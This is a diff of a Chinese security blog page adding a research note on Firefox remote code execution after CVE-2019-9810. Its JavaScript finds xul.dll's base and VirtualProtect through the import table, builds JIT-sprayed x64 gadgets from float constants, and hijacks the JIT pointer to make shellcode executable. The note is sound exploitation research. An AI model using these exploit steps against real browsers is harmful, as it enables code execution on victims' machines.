@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>ruan</title>
+  <title>Firefox RCE的一些记录 | ruan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ruan">
-<meta property="og:url" content="http://yoursite.com/page/4/index.html">
+  <meta name="description" content="记录下firefox下RCE的一些操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Firefox RCE的一些记录">
+<meta property="og:url" content="http://yoursite.com/2022/05/30/firefox_rce%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="ruan">
+<meta property="og:description" content="记录下firefox下RCE的一些操作">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-30T09:21:45.000Z">
+<meta property="article:modified_time" content="2022-05-31T12:30:31.775Z">
 <meta property="article:author" content="ruan">
 <meta name="twitter:card" content="summary">
   
@@ -136,33 +140,50 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-TCTF2020Final_koh_prop" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-firefox_rce的一点记录" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/04/TCTF2020Final_koh_prop/">TCTF 2020 FINAL koh_prop</a>
+    <h1 class="article-title" itemprop="name">
+      Firefox RCE的一些记录
     </h1>
   
 
         
-        <a href="/2020/10/04/TCTF2020Final_koh_prop/" class="archive-article-date">
-  	<time datetime="2020-10-04T08:11:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-04</time>
+        <a href="/2022/05/30/firefox_rce%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2022-05-30T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录下这题koh</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/10/04/TCTF2020Final_koh_prop/#more">more >></a>
-        
+        <p>记录下firefox下RCE的一些操作</p>
+<p><escape><span id="more"></span></escape></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着<a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/">https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/</a> 这篇文章复现cve-2019-9810后，因为Firefox不像Chrome那样有WebAssembly好用的操作，所以在获取任意地址读写和addrof原语后还需要一些步骤才能最终执行我们的shellcode</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>以下都是已经有了任意地址读写和addrof原语下的操作</p>
+<h3 id="泄露xul-dll基址"><a href="#泄露xul-dll基址" class="headerlink" title="泄露xul.dll基址"></a>泄露xul.dll基址</h3><p>xul.dll是firefox的最主要的dll，除了内存分配相关的函数不在这个dll里，其它的函数几乎都在这个dll中，泄露的方式为利用addrof原语获得一个非array对象的地址，接着泄露利用任意地址读它的elements，非Array对象的elements会指向xul.dll中的某个地方，接着靠向前一页一页的寻找（为了避免写死特定的偏移），利用PE文件格式特有的’MZ’和’PE’来定位：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindModuleBase</span>(<span class="params">Mem,ModuleAddr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addr = ModuleAddr - (ModuleAddr &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = Mem.Read32(addr);</span><br><span class="line">        <span class="keyword">if</span>((value &amp; <span class="number">0xffff</span>) == <span class="number">0x5a4d</span>)&#123;		<span class="comment">// &#x27;MZ&#x27;</span></span><br><span class="line">            <span class="comment">// read e_lfanew</span></span><br><span class="line">            <span class="keyword">var</span> e_lfanew = Mem.Read32(addr+<span class="number">0x3c</span>);</span><br><span class="line">            <span class="keyword">var</span> pe_header = Mem.Read32(addr+e_lfanew);</span><br><span class="line">            <span class="keyword">if</span>(pe_header == <span class="number">0x00004550</span>)&#123;	<span class="comment">// &#x27;PE\x00\x00&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr - <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找virtualProtect函数地址"><a href="#寻找virtualProtect函数地址" class="headerlink" title="寻找virtualProtect函数地址"></a>寻找virtualProtect函数地址</h3><p>有了xul.dll地址，我们继续寻找我们需要的API的地址，也就是virtualProtect，原理就是解析xul.dll，找到IAT在依次遍历：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindImportDescriptor</span>(<span class="params">Mem,ModuleBase,DllName2Find</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> ImgDosHeader_e_lfanew  = Mem.Read32(ModuleBase+<span class="number">0x3c</span>);</span><br><span class="line">    <span class="keyword">var</span> ImgNtHeaders64 = ModuleBase + ImgDosHeader_e_lfanew;</span><br><span class="line">    <span class="keyword">var</span> ImportDescriptor = ModuleBase + Mem.Read32(</span><br><span class="line">        ImgNtHeaders64 + <span class="number">0x18</span> + <span class="number">0x70</span> + (<span class="number">1</span> * <span class="number">8</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> NameRVA = Mem.Read32(ImportDescriptor + <span class="number">3</span>*<span class="number">4</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(NameRVA == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> NameAddress = ModuleBase + NameRVA;</span><br><span class="line">        <span class="keyword">var</span> dllName = Mem.ReadString(NameAddress);</span><br><span class="line">        <span class="comment">// console.log(dllName);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dllName.toLowerCase() == DllName2Find.toLowerCase()) &#123;</span><br><span class="line">            found = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ImportDescriptor = ImportDescriptor + <span class="number">0x14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> found ? ImportDescriptor : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindImportedAPI</span>(<span class="params">Mem,ModuleBase,DllName,APINames</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ImportDescriptor = FindImportDescriptor(Mem, ModuleBase, DllName);</span><br><span class="line">    <span class="keyword">if</span>(ImportDescriptor == -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// what happen??</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> ImportAddresses = ModuleBase + Mem.Read32(ImportDescriptor + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">const</span> ImportNames = ModuleBase + Mem.Read32(ImportDescriptor);</span><br><span class="line">    <span class="keyword">var</span> Idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> ImportAddress = Mem.Read64(ImportAddresses + Idx * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ImportAddress == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> ImportNameAddress = ModuleBase + Mem.Read32(ImportNames + Idx * <span class="number">8</span>) + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> ImportName = Mem.ReadString(ImportNameAddress);</span><br><span class="line">        <span class="comment">// console.log(ImportName);</span></span><br><span class="line">        ImportName = ImportName.toLowerCase();</span><br><span class="line">        <span class="keyword">if</span>(ImportName.includes(APINames.toLowerCase()))&#123;</span><br><span class="line">            <span class="comment">// find API we needed</span></span><br><span class="line">            <span class="keyword">return</span> ImportAddress;</span><br><span class="line">        &#125;</span><br><span class="line">        Idx += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jit-gadget"><a href="#jit-gadget" class="headerlink" title="jit gadget"></a>jit gadget</h3><p>firefox会将被jit函数中的常量放到一个可读可执行的段中，这意味着我们可以将gadget用常量的形式来构建（避免在dll中寻找，节约时间）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rwx_helper</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    Magic = <span class="number">5.40900888e-315</span>; <span class="comment">// 0x41414141 in memory</span></span><br><span class="line">    _cc = <span class="number">3.1402755315847004e-304</span>;	<span class="comment">// 0xcc  for debug</span></span><br><span class="line">    _v0=<span class="number">3.140274606181765e-304</span>;		<span class="comment">// mov rcx, [r8+0x8];</span></span><br><span class="line">    _v1=<span class="number">3.1402746713591553e-304</span>;	<span class="comment">// shl rcx, 0x11;</span></span><br><span class="line">    _v2=<span class="number">3.140274671571355e-304</span>;		<span class="comment">// shr rcx, 0x11;</span></span><br><span class="line">    _v3=<span class="number">3.140274932146843e-304</span>;		<span class="comment">// mov rcx, [rcx+0x38];</span></span><br><span class="line">    _v4=<span class="number">3.1402755328480012e-304</span>;	<span class="comment">// xor rax, rax</span></span><br><span class="line">    _v5=<span class="number">3.1402755335641748e-304</span>;	<span class="comment">// xor rbx, rbx</span></span><br><span class="line">    _v6=<span class="number">3.1402747146157466e-304</span>;	<span class="comment">// mov eax, [r8+0x18];</span></span><br><span class="line">    _v7=<span class="number">3.140274660929253e-304</span>;		<span class="comment">// mov ebx, [r8+0x10];</span></span><br><span class="line">    _v8=<span class="number">3.1402747731884283e-304</span>;	<span class="comment">// shr rax, 0x20;</span></span><br><span class="line">    _v9=<span class="number">3.1402755334796265e-304</span>;	<span class="comment">// add rax, rbx;</span></span><br><span class="line">    _v10=<span class="number">3.140024229549804e-304</span>;	<span class="comment">// push 0x1000;</span></span><br><span class="line">    _v11=<span class="number">3.1401776451880772e-304</span>;	<span class="comment">// pop rdx;push 0x20;pop r8;</span></span><br><span class="line">    _v12=<span class="number">3.176069243297874e-304</span>;	<span class="comment">// mov r9,rsp;push rcx;jmp rax;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">    get_rwx_helper();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Magic常量是为了在内存中更好的定位到这些gadget</p>
+<p>转换用到的util.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> u64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2q</span>(<span class="params">f</span>)</span>&#123;</span><br><span class="line">    f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> u64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">q2f</span>(<span class="params">q</span>)</span>&#123;</span><br><span class="line">    u64[<span class="number">0</span>] = q;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="number">0x100</span>);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0xeb909008488b49n</span>;	<span class="comment">// mov rcx, [r8+0x8];</span></span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0xeb909011e1c148n</span>;	<span class="comment">// shl rcx, 0x11;</span></span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0xeb909011e9c148n</span>;	<span class="comment">// shr rcx, 0x11;</span></span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0xeb909038498b48n</span>;	<span class="comment">// mov rcx, [rcx+0x38];</span></span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0xeb909090c03148n</span>;	<span class="comment">// xor rax, rax</span></span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0xeb909090db3148n</span>;	<span class="comment">// xor rbx, rbx</span></span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0xeb909018408b41n</span>;	<span class="comment">// mov eax, [r8+0x18];</span></span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0xeb909010588b41n</span>;	<span class="comment">// mov ebx, [r8+0x10];</span></span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xeb909020e0c148n</span>;	<span class="comment">// shr rax, 0x20;</span></span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0xeb909090d80148n</span>;	<span class="comment">// add rax, rbx;</span></span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xeb900000100068n</span>;	<span class="comment">// push 0x1000;</span></span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0xeb905841206a5an</span>;	<span class="comment">// pop rdx;push 0x20;pop r8;</span></span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0xebe0ff51e18949n</span>;	<span class="comment">// mov r9,rsp;push rcx;jmp rax;</span></span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0xeb9090909090ccn</span>;	</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; shellcode.length;i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(shellcode[i] != <span class="number">0</span>)</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;_v&#x27;</span>+ i.toString() + <span class="string">&#x27;=&#x27;</span> + q2f(shellcode[i]).toString() + <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="劫持jit指针"><a href="#劫持jit指针" class="headerlink" title="劫持jit指针"></a>劫持jit指针</h3><p>找到我们的gadget后，只需将jit指针劫持到这些gadget即可：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jitfuncAddr = mem.Addrof(get_rwx_helper);</span><br><span class="line"><span class="keyword">var</span> jitinfo = mem.Read64(jitfuncAddr + <span class="number">0x30</span>);</span><br><span class="line"><span class="keyword">var</span> rx_region = mem.Read64(jitinfo);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hex(rx_region));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iterator = rx_region; <span class="comment">// Start from the RX region</span></span><br><span class="line"><span class="keyword">var</span> found = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// search Magic</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x800</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = mem.Read64(iterator);</span><br><span class="line">    <span class="keyword">if</span>(data == <span class="number">0x41414141</span>) &#123;</span><br><span class="line">        iterator = iterator + <span class="number">8</span>;</span><br><span class="line">        found = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    iterator = iterator + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!found) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[-] Failed to find the JIT start&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hex(iterator));</span><br><span class="line">Write64(jitinfo,iterator);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> virtualProtect_low = virtualProtect &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="keyword">var</span> virtualProtect_high = <span class="built_in">Math</span>.floor(virtualProtect / base);</span><br><span class="line"></span><br><span class="line">get_rwx_helper(shellcode,virtualProtect_low,virtualProtect_high);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在最后调用jit函数的时候是传入了参数的，这是为了方便，我们直接把shellcode的地址和virtualProtect函数的地址直接作为参数传入，这样我们劫持程序执行流到我们布置好的gadget的时候，r8寄存器会指向这些参数（对应gadget中的<code>mov r/a/b/cx, [r8 + offset]</code>）</p>
+<p>gadget的效果就是将shellcode所在的段的权限用virtualProtect改为可执行，最后在跳转过去执行真正的shellcode</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/">https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/</a></p>
+
       
 
       
@@ -173,16 +194,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/10/04/TCTF2020Final_koh_prop/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2022/05/30/firefox_rce%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/19/spider-monkey%E7%BC%96%E8%AF%91%E7%9B%B8%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">spider-monkey 编译相关</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -197,609 +277,32 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-easy_unicorn题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/10/easy_unicorn%E9%A2%98%E8%A7%A3/">xctf  easy_unicorn</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/10/easy_unicorn%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-09-10T12:00:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>xctf今年第一场分站赛的一题pwn题</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/09/10/easy_unicorn%E9%A2%98%E8%A7%A3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/10/easy_unicorn%E9%A2%98%E8%A7%A3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2xul-dll%E5%9F%BA%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">泄露xul.dll基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEvirtualProtect%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">寻找virtualProtect函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jit-gadget"><span class="toc-number">2.3.</span> <span class="toc-text">jit gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81jit%E6%8C%87%E9%92%88"><span class="toc-number">2.4.</span> <span class="toc-text">劫持jit指针</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
-  
-    <article id="post-DDCTF2020_we_love_free" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/07/DDCTF2020_we_love_free/">DDCTF2020 we_love_free</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/07/DDCTF2020_we_love_free/" class="archive-article-date">
-  	<time datetime="2020-09-07T08:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>j师傅牛逼，直接带飞，记录下ddctf的一道pwn题，we_love_free</p>
-<p><escape>
-        
-          <a class="article-more-a" href="/2020/09/07/DDCTF2020_we_love_free/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/07/DDCTF2020_we_love_free/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-强网杯和钓鱼城ctf部分题解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">强网杯和钓鱼城ctf部分题解</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%92%8C%E9%92%93%E9%B1%BC%E5%9F%8Ectf%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
